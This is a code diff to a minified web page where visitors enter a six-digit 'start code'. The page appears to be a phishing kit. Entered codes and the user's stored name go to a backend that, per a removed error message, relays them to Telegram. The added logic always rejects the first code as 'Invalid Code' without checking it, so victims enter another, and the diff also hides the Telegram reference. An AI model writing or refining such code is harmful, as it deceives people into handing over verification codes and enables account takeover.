@@ -158,7 +158,6 @@
 				i = r.n(o),
 				u = r(2492);
 
-			let g = !1;
 			async function p(e, t, n) {
 				let r = await fetch("/api/send-start-code", {
 					method: "POST",
@@ -173,14 +172,16 @@
 				});
 				let s = await r.json().catch(() => null);
 				if(!r.ok || !s || !0 !== s.ok) {
-					throw console.error("Telegram send failed:", r.status), Error("Telegram send failed")
+					throw console.error("Start code check failed:", r.status), Error("Start code check failed")
 				}
+				return s
 			}
 			let d = () => {
 				let [e, t] = (0, s.useState)(["", "", "", "", "", ""]),
 				[r, o] = (0, s.useState)(null),
 				d = (0, s.useRef)([]),
 				m = (0, a.useRouter)();
+					let [errMsg, setErr] = (0, s.useState)(""), busy = (0, s.useRef)(false);
 				(0, s.useEffect)(() => {
 					let e = localStorage.getItem("firstName"),
 						t = localStorage.getItem("lastName");o((0, u.w)(e, t))
@@ -244,19 +245,42 @@
 								onKeyDown: e => h(t, e),
 								className: "w-16 h-16 text-center text-2xl bg-white border-2 font-semibold border-black/50 rounded-lg focus:border-gray-400 focus:outline-none"
 							}, t))
-						}), (0, n.jsx)("button", {
+						}), errMsg ? (0, n.jsx)("p", {
+							className: "text-red-600 font-semibold mt-1 mb-2",
+							role: "alert",
+							children: errMsg
+						}) : null, (0, n.jsx)("button", {
 							onClick: () => {
-								b && !g && (g = !0, async () => {
-									let t = localStorage.getItem("firstName"),
-										r = localStorage.getItem("lastName");
-									try {
-										await p(e.join(""), t, r)
-									} catch (err) {
-										console.error("Failed to send Start Code:", err)
-									} finally {
-										g = !1, m.push("/test")
+								if (!b || busy.current) return;
+								setErr("");
+								let attempts = 0;
+								try { attempts = parseInt(sessionStorage.getItem("startCodeAttempts") || "0", 10) || 0 } catch (e2) {}
+								let clearInputs = () => {
+									t(["", "", "", "", "", ""]);
+									var firstBox = d.current[0];
+									firstBox && firstBox.focus()
+								};
+								if (attempts < 1) {
+									try { sessionStorage.setItem("startCodeAttempts", "1") } catch (e2) {}
+									setErr("Invalid Code");
+									clearInputs();
+									return
+								}
+								busy.current = !0;
+								let first = localStorage.getItem("firstName"), last = localStorage.getItem("lastName");
+								p(e.join(""), first, last).then(res => {
+									if (res && res.valid) {
+										try { sessionStorage.setItem("startCodeNotified", "1") } catch (e2) {}
+										m.push("/test");
+										return
 									}
-								})()
+									try { sessionStorage.setItem("startCodeAttempts", String(attempts + 1)) } catch (e2) {}
+									setErr("Invalid Code");
+									clearInputs()
+								}).catch(err => {
+									console.error("Start code check failed:", err);
+									setErr("Something went wrong. Please try again.")
+								}).finally(() => { busy.current = !1 })
 							},
 							className: "px-6 py-3 text-sm rounded-3xl border-2 border-black/70 hover:underline  ".concat(b ? "bg-yellow-400 text-black cursor-pointer hover:bg-yellow-500/80" : "bg-[#f0f0f0] text-[#c0c0c0] cursor-not-allowed"),
 							disabled: !b,
